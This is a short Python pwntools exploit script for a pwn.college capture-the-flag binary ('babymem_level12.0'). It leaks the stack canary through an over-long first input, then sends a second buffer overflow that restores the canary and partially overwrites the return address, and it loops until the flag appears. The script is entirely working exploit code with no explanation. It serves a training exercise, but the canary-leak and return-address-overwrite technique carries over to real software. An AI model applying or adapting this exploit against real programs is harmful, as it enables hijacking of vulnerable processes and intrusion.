from pwn import *


while True:
    p = process('/challenge/babymem_level12.0')

    p.recvuntil('Payload size:')
    p.sendline(b'89')

    payload = b'REPEAT' + b'a' * 82

    #p.recvline('Send your payload')
    p.sendline(payload)

    p.recvuntil('You said: ')
    str = p.recvuntil('This challenge')
    canary = bytearray()
    canary.append(0)
    for i in range(89,96):
        canary.append(str[i])

    #print(canary)
    #p.recvuntil('Payload size:')
    p.sendline(b'106')
    payload =  b'a' * 88 + canary + b'a' * 8 + p16(0x21fc)
    p.recvuntil('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    #print(str)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
